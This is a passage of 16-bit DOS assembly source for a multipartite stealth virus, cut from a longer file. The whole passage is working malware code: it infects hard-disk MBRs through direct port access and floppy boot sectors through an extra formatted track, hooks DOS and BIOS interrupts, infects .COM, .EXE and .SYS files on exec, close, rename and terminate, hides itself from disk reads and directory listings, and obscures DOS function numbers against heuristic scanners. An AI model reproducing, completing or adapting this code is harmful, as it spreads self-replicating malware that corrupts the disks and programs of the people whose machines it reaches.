   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Exit from infected hd mbr or floppy boot sector                           ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   exit_mbr:
                   ;Get .sys parameter block pointer out of stack
                   pop bx
                   ;Restore segment registers
                   pop es
                   pop ds

                   ;Reboot system
                   int 19h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Exit from .sys infected files                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   exit_sys:
                   ;Point to old .sys header ( offset of strategy routine address )
                   lea si,word ptr [old_header+0006h][bp]
                   mov di,0006h
                   cld
                   lodsw
                   stosw

                   ;Get .sys parameter block pointer
                   pop bx
                   ;Restore segment registers
                   pop es
                   pop ds

                   ;Get control back to strategy subroutine
                   push cs
                   push ax

                   ;Clear some regs
                   xor ax,ax
                   xor cx,cx
                   xor dx,dx
                   xor si,si
                   xor di,di
                   xor bp,bp
                   retf

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Exit from .com infected files                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   exit_com:
                   ;Restore first three bytes
                   lea si,word ptr [old_header][bp]
                   mov di,0100h
                   mov cx,0003h
                   cld
                   rep movsb

                   ;Get .sys parameter block pointer
                   pop bx
                   ;Restore segment registers
                   pop es
                   pop ds

                   ;Get control back to host
                   push cs
                   push 0100h

                   ;Clear some regs
                   xor ax,ax
                   xor bx,bx
                   xor cx,cx
                   xor dx,dx
                   xor si,si
                   xor di,di
                   xor bp,bp
                   retf

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Exit from .exe infected files                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   exit_exe:
                   ;Get .sys parameter block pointer
                   pop bx
                   ;Restore segment registers
                   pop es
                   pop ds

                   ;Get active psp
                   mov ah,62h
                   int 21h
                   add bx,10h
                   add word ptr cs:[exe_cs][bp],bx
                   ;Restore stack
                   cli
                   add bx,word ptr cs:[old_header+0Eh][bp]
                   mov ss,bx
                   mov sp,word ptr cs:[old_header+10h][bp]
                   sti

                   ;Clear some regs
                   xor ax,ax
                   xor bx,bx
                   xor cx,cx
                   xor dx,dx
                   xor si,si
                   xor di,di
                   xor bp,bp
                   sti

                   ;Clear prefetch
                   db 0EBh,00h
                   ;Jump to original entry point
                   db 0EAh

   exeret          equ this byte

   exe_ip          dw 0000h
   exe_cs          dw 0000h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Exit program if launcher execution                                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   exit_launcher:
                   ;Get .sys parameter block pointer
                   pop bx
                   ;Restore segment registers
                   pop es
                   pop ds

                   ;Use terminate program in droppers
                   mov ax,4C00h
                   int 21h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Write hard drive mbr using direct port access                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   hd_write_port:
                   ;Save some reg
                   push cx
                   push dx
                   push si

                   ;Get offset of write buffer
                   mov si,bx
                   call pause_some_ms

   try_hd_port_again:

                   ;Enable disk reset (FDC)
                   mov dx,03F6h
                   mov al,04h
                   out dx,al
                   call pause_some_ms
                   xor al,al
                   out dx,al
                   call pause_some_ms

                   ;Send drive 00h and head 00h
                   mov dx,01F6h
                   mov al,0A0h
                   out dx,al
                   call pause_some_ms

                   ;Prepare drive to write at cylinder 00h
                   mov dx,01F7h
                   mov al,10h
                   out dx,al
                   call wait_drive_ready

                   ;Check for errors on drive operation
                   mov dx,01F1h
                   in al,dx
                   and al,68h
                   jnz try_hd_port_again
                   call wait_drive_ready

                   ;Send number of sectors to write ( 01h sector )
                   mov dx,01F2h
                   mov al,01h
                   out dx,al
                   call pause_some_ms

                   ;Send sector
                   mov dx,01F3h
                   mov al,01h
                   out dx,al
                   call pause_some_ms

                   ;Send cylinder high
                   mov dx,01F4h
                   xor al,al
                   out dx,al
                   call pause_some_ms

                   ;Send cylinder low
                   mov dx,01F5h
                   xor al,al
                   out dx,al
                   call pause_some_ms

                   ;Send drive and head
                   mov dx,01F6h
                   mov al,0A0h
                   out dx,al
                   call pause_some_ms

                   ;Send command (write sector without retry)
                   mov dx,01F7h
                   mov al,31h
                   out dx,al
                   call wait_seek_ready

                   ;Send data to port ( 0100h words for 01h sector )
                   mov cx,0100h
                   mov dx,01F0h
                   cld
                   rep outsw
                   call wait_drive_ready

   exit_mbr_infection:

                   ;Restore regs and return
                   pop si
                   pop dx
                   pop cx
                   ret

   wait_drive_ready:

                   ;Check drive-ready flag
                   mov dx,01F7h
   still_working:

                   in al,dx
                   test al,80h
                   jnz still_working
                   ret

   wait_seek_ready:

                   call wait_drive_ready

                   ;Check if seek operation complete
                   test al,08h
                   jz wait_seek_ready

                   ret

   pause_some_ms:  mov cx,0008h
   void_loop:      loop void_loop
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus int 1Ch handler                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   my_int1Ch:
                   ;Do not use this handler if file infection is active
                   cmp byte ptr cs:[file_infection_flag],0FFh
                   je my1Ch_exit

                   ;Inc virus timer counter
                   inc word ptr cs:[virus_timer]

                   ;Check if time to hook dos
                   cmp word ptr cs:[virus_timer],0100h
                   jne not_time_for_dos

                   ;Try to hook dos
                   call hook_dos
                   jmp short my1Ch_exit

   not_time_for_dos:

                   ;Check if time to start infecting files
                   cmp word ptr cs:[virus_timer],1000h
                   jne my1Ch_exit

                   ;Set file infection flag and stop virus timer
                   mov byte ptr cs:[file_infection_flag],0FFh
   my1Ch_exit:

                   ;Get control back to old int 1Ch
                   jmp dword ptr cs:[old1Ch]

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus int 12h handler                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   my_int12h:
                   ;Perform int call
                   pushf
                   call dword ptr cs:[old12h]

                   ;Installation check
                   cmp si,00BADh
                   jne not_check_v
                   cmp di,0FACEh
                   jne not_check_v

                   ;Check if call comes from infected .com or .exe files
                   cmp cx,029Ah
                   jne not_from_exe_com
                   call hook_dos

   not_from_exe_com:

                   ;Im here!!!
                   mov si,0DEADh
                   mov di,0BABEh
   not_check_v:
                   iret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus int 13h handler                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   my_int13h:
                   ;Hook dos on first write operation
                   cmp ah,03h
                   jne look_mbr
                   call hook_dos
   look_mbr:
                   ;Check for head 00h
                   or dh,dh
                   jnz my13h_exit

                   ;Take care about track 00h
                   or ch,ch
                   jne my13h_exit

                   ;Floppy or hd?
                   cmp dl,80h
                   je is_hd_operation
                   or dl,dl
                   jz is_floppy_operation
                   jmp my13h_exit

   is_hd_operation:

                   ;Check for write operations
                   cmp ah,03h
                   je hd_write

                   ;Check for extended write operations
                   cmp ah,0Bh
                   je hd_write

                   ;Check for read operations
                   cmp ah,02h
                   je hd_read

                   ;Check for extended read operations
                   cmp ah,0Ah
                   je hd_read

   my13h_exit:
                   ;Get control back to old int 13h
                   jmp dword ptr cs:[old13h]

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Monitoring hd write operations                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   hd_write:

                   ;Trying to overwrite virus sectors?
                   cmp cl,04h+inf_sect_size
                   ja my13h_exit

                   ;Return without error
                   clc
                   retf 02h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Monitoring hd read operations                                             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   hd_read:
                   ;Trying to read infected mbr?
                   cmp cl,01h
                   je stealth_mbr

                   ;Trying to read sectors on witch virus resides?
                   cmp cl,04h+inf_sect_size
                   ja my13h_exit

                   ;Return with error
                   stc
                   retf 02h

   stealth_mbr:
                   ;Redirect reads to infected mbr into the clean copy
                   mov al,01h
                   mov cl,03h
                   pushf
                   call dword ptr cs:[old13h]
                   jc mbr_stealth_error

                   ;Decrypt mbr
                   call crypt_sector
                   clc

   mbr_stealth_error:
                   retf 02h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Perform encryption over es:[bx] 0200h byte                                ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   crypt_sector:

                   push ax
                   push cx
                   push di

                   mov cx,0200h/02h
                   mov di,bx
                   cld

   sector_loop_crypt:

                   mov ax,word ptr es:[di]
                   not ax
                   stosw
                   loop sector_loop_crypt

                   pop di
                   pop cx
                   pop ax
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus floppy infection routine                                            ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   is_floppy_operation:

                   ;Check of buffer in use by int 21h handler
                   cmp byte ptr cs:[running_sw],00h
                   jne my13h_exit

                   ;Check read operations
                   cmp ah,02h
                   jne my13h_exit

                   ;Over sector 01h
                   cmp cl,01h
                   jne my13h_exit

                   ;Perform read operation
                   call do_int13h
                   jnc ok_floppy_read
                   retf 02h

   ok_floppy_read:

                   ;Save all regs, we are going to trash them
                   call push_all

                   ;Check if floppy already infected
                   call get_position
                   cmp word ptr es:[di+boot_marker-boot_code],"RC"
                   jne not_infected

                   ;Read original boot sector
                   call pop_all
                   call read_boot_extra
                   retf 02h

   not_infected:
                   ;Check for mbr marker also in floppy
                   cmp word ptr es:[bx+01FEh],0AA55h
                   jne exit_floppy_infection

                   ;Check if dos has been loaded
                   cmp byte ptr cs:[dos_flag],0FFh
                   je environment_ready

   exit_floppy_infection:

                   call pop_all
                   clc
                   retf 02h

   environment_ready:

                   ;Choose disk device parameter table
                   mov ax,word ptr es:[bx+13h]
                   mov di,offset floppy5_25
                   cmp ax,0960h
                   je ok_ddpt_index
                   mov di,offset floppy3_5
                   cmp ax,0B40h
                   jne exit_floppy_infection

   ok_ddpt_index:

                   ;Save some regs
                   push es
                   push bx
                   push dx

                   ;Get int 1Eh (address where bios stores a pointer to ddpt)
                   mov al,1Eh
                   call get_int

                   ;Save int 1Eh
                   mov word ptr cs:[old1Eh_off],bx
                   mov word ptr cs:[old1Eh_seg],es

                   ;Hook int 1Eh to our ddpt
                   push cs
                   pop ds
                   mov dx,di
                   call set_int

                   ;Point to format table
                   ;(Track 50h,side 00h,200h bytes per sector)
                   push cs
                   pop es
                   mov bx,offset format_table

                   ;Format the extra track
                   mov ax,0501h+inf_sect_size
                   mov cx,5001h
                   pop dx
                   call do_int13h
                   jnc extra_track_done

                   ;Restore pointer to read buffer
                   pop bx
                   pop es
                   jmp abort_floppy

   extra_track_done:

                   ;Restore pointer to read buffer
                   pop bx
                   pop es

                   ;Write original boot sector on first extra sector
                   mov ax,0301h
                   call do_int13h
                   jc abort_floppy

                   ;Copy virus body from hd to floppy ( sector by sector )
                   mov cx,inf_sect_size
   copy_hd_sector:
                   push cx
                   mov al,cl
                   mov cl,inf_sect_size+04h
                   sub cl,al
                   mov dl,80h
                   mov ax,0201h
                   call do_int13h
                   jnc hd_sector_ready

   replication_error:

                   pop cx
                   call read_boot_extra
                   jmp abort_floppy

   hd_sector_ready:

                   mov ch,50h
                   sub cl,02h
                   xor dl,dl
                   mov ax,0301h
                   call do_int13h
                   jc replication_error
                   pop cx
                   loop copy_hd_sector

                   ;Read original boot sector saved on extra track
                   call read_boot_extra
                   jc abort_floppy

                   ;Save virus position on disk
                   inc cl
                   mov word ptr cs:[load_cx],cx

                   ;Move virus loader into boot sector
                   call get_position
                   mov si,offset boot_code
                   mov cx,boot_size
                   cld
                   rep movsb

                   ;Write loader over floppy boot sector
                   mov ax,0301h
                   mov cl,01h
                   call do_int13h

                   ;Get original boot sector again
                   call read_boot_extra
   abort_floppy:
                   ;Restore int 1Eh
                   lds dx,dword ptr cs:[old1Eh]
                   mov al,1Eh
                   call set_int
                   jmp exit_floppy_infection

   read_boot_extra:

                   ;Read original boot sector saved on extra track
                   mov ax,0201h
                   mov cx,5001h
                   call do_int13h
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Perform int 13h call                                                      ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   do_int13h:
                   ;Check for floppy write operations
                   cmp ah,03h
                   jne do_not_use40h
                   or dl,dl
                   jz use_int40h

   do_not_use40h:
                   ;Perform call
                   pushf
                   call dword ptr cs:[old13h]
                   ret
   use_int40h:
                   ;Perform call using int 40h
                   pushf
                   call dword ptr cs:[old40h]
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus loader ( inserted into hd mbr and floppy boot sectors )             ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   boot_code:
                   ;Setup stack and segment regs
                   cli
                   xor ax,ax
                   mov ss,ax
                   mov es,ax
                   mov ds,ax
                   mov sp,7C00h
                   sti

                   ;Prepare for reading virus body
                   mov ax,0200h+inf_sect_size

                   ;Read at 0000h:7E00h
                   mov bx,7E00h

                   ;Get position in disk
                   ;mov cx,XXXXh
                   db 0B9h
   load_cx         dw 0000h
                   sub dh,dh

                   ;Read virus body next to loader
                   int 13h
                   jc error_init

                   ;Continue execution on virus body
                   push es
                   push bx
                   retf

   error_init:
                   ;Error during virus initialization
                   int 18h

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Floppy boot sector infected marker                                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   boot_marker     db "CR"
                   ;End of boot code
   boot_end        equ this byte

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Hook int 21h ( try to find original int 21h address using psp tracing )   ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   hook_dos:
                   ;Save regs
                   call push_all

                   ;Check if dos has been loaded
                   cmp byte ptr cs:[dos_flag],00h
                   jne exit_wait

                   ;Set dos loaded flag
                   mov byte ptr cs:[dos_flag],0FFh

                   ;Restore bios allocated memory
                   xor ax,ax
                   mov ds,ax
                   add word ptr ds:[0413h],mem_kb_size

                   ;Check dos version
                   mov ah,30h
                   int 21h
                   cmp al,04h
                   jb exit_wait

                   ;Get our segment
                   push cs
                   pop ds

                   ;Get int 21h vector
                   mov al,21h
                   call get_int

                   ;Save old int 21h vector
                   mov word ptr ds:[old21h_off],bx
                   mov word ptr ds:[old21h_seg],es

                   ;Save old 21h as original for errors on psp tracing
                   mov word ptr ds:[org21h_off],bx
                   mov word ptr ds:[org21h_seg],es

                   ;Point int 21h to our handler
                   mov dx,offset my_int21h
                   call set_int

                   ;Try to find original 21h tracing psp
                   mov ah,62h
                   int 21h
                   mov es,bx

                   ;Point ds:si to dispatch handler
                   lds si,dword ptr es:[0006h]

   trace_loop:
                   ;Check if there is a jump instruction
                   cmp byte ptr ds:[si],0EAh
                   jne try_dispatcher

                   ;Check if there is a double-nop
                   lds si,dword ptr ds:[si+01h]
                   mov ax,9090h
                   cmp ax,word ptr ds:[si]
                   jne trace_loop

                   ;Sub offset from dispatcher
                   sub si,32h

                   ;Check if there is a double-nop
                   cmp ax,word ptr ds:[si]
                   je found_original

   try_dispatcher:

                   ;Check for cs prefix and push ds
                   cmp word ptr ds:[si],2E1Eh
                   jne exit_wait

                   ;Add offset from dispatcher
                   add si,0025h

                   ;Check for cli and push ax instructions
                   cmp word ptr ds:[si],80FAh
                   jne exit_wait

   found_original:

                   ;Save found address
                   mov word ptr cs:[org21h_off],si
                   mov word ptr cs:[org21h_seg],ds
   exit_wait:
                   ;Restore regs and return
                   call pop_all
                   ret

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Virus int 21h handler                                                     ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   my_int21h:
                   ;Save entry regs
                   call push_all

                   ;Get our code segment int ds
                   push cs
                   pop ds

                   ;Set int 21h running switch
                   mov byte ptr ds:[running_sw],0FFh

                   ;Anti-heuristic function number examination
                   xor ax,0FFFFh
                   mov word ptr ds:[dos_function],ax

                   ;Get int 24h vector
                   mov al,24h
                   call get_int

                   ;Save old int 24h
                   mov word ptr ds:[old24h_seg],es
                   mov word ptr ds:[old24h_off],bx

                   ;Hook int 24h to a do-nothing handler
                   mov dx,offset my_int24h
                   call set_int

                   ;Check for special files
                   mov ah,62h
                   call dos_call
                   dec bx
                   mov es,bx
                   mov ax,word ptr es:[0008h]
                   mov byte ptr ds:[stealth_sw],00h

                   ;Check if arj is running
                   cmp ax,"RA"
                   je disable_stealth

                   ;Check for pkzip utils
                   cmp ax,"KP"
                   je disable_stealth

                   ;Check for lha
                   cmp ax,"HL"
                   je disable_stealth

                   ;Check for backup
                   cmp ax,"AB"
                   je disable_stealth

                   jmp no_running

   disable_stealth:

                   mov byte ptr ds:[stealth_sw],0FFh
   no_running:
                   ;Restore and re-save all regs
                   call pop_all
                   call push_all
                   ;Put function number into bx
                   mov bx,word ptr cs:[dos_function]

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Check for activation circunstances                                        ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   activation_00:
                   ;Get dos date
                   cmp bh,(2Ah xor 0FFh)
                   jne infection_00
                   jmp dos_get_date

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Infection functions                                                       ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   infection_00:
                   ;Exec function ( save filename for later infection )
                   cmp bx,(4B00h xor 0FFFFh)
                   jne infection_01
                   jmp dos_exec
   infection_01:
                   ;Close file (Handle)
                   cmp bh,(3Eh xor 0FFh)
                   jne infection_02
                   jmp dos_close
   infection_02:
                   ;Get or set file attribute
                   cmp bh,(43h xor 0FFh)
                   jne infection_03
                   jmp infect_file_ds_dx
   infection_03:
                   ;Rename or move file
                   cmp bh,(56h xor 0FFh)
                   jne infection_04
                   jmp infect_file_ds_dx
   infection_04:
                   ;Terminate program ( infect executed program )
                   cmp bh,(4Ch xor 0FFh)
                   jne stealth_dos
                   jmp dos_terminate_prog

   ;ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ;³Stealth functions                                                         ³
   ;ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

   stealth_dos:
                   ;Check if stealth is disabled
                   cmp byte ptr cs:[stealth_sw],0FFh
                   je m21h_exit

                   ;Open file (Handle)
                   cmp bh,(3Dh xor 0FFh)
                   jne stealth_00
                   jmp dos_open
   stealth_00:
                   ;Extended open
                   cmp bh,(6Ch xor 0FFh)
                   jne stealth_01
                   jmp dos_open
   stealth_01:
                   ;Directory stealth works with function Findfirst (fcb)
                   cmp bh,(11h xor 0FFh)
                   jne stealth_02
                   jmp ff_fcb
   stealth_02:
                   ;Directory stealth works also with function Findnext(fcb)
                   cmp bh,(12h xor 0FFh)
                   jne stealth_03
                   jmp ff_fcb
   stealth_03:
                   ;Search stealth works with Findfirst (handle)
                   cmp bh,(4Eh xor 0FFh)
                   jne stealth_04
                   jmp ff_handle
   stealth_04:
                   ;Search stealth works also with Findnext (handle)
                   cmp bh,(4Fh xor 0FFh)
                   jne stealth_05
                   jmp ff_handle
   stealth_05:
